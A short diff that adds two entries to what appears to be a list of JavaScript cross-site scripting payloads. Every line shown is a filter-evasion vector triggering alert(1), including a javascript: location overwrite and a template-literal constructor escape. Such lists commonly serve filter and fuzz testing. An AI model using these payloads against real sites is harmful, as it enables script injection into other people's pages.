@@ -314,3 +314,5 @@ eval(JSON.stringify({a:1},null,'alert(1)//'))
 Array.from([1],alert)
 function document::onreadystatechange(){alert(1);}
 Object.defineProperties(window,{'location':{value:'javascript:alert(1)'}})
+/1/[Symbol.replace]('1',alert)
+${''.constructor.constructor('alert(1)')()}
